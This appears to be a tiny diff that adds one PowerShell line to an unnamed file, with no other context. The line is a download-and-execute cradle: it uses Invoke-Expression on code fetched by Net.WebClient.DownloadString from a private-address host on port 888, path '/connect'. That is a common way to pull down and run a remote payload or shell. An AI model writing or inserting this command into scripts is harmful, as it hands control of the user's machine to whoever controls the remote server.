@@ -1,0 +1,1 @@
+Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.88.145:888/connect')
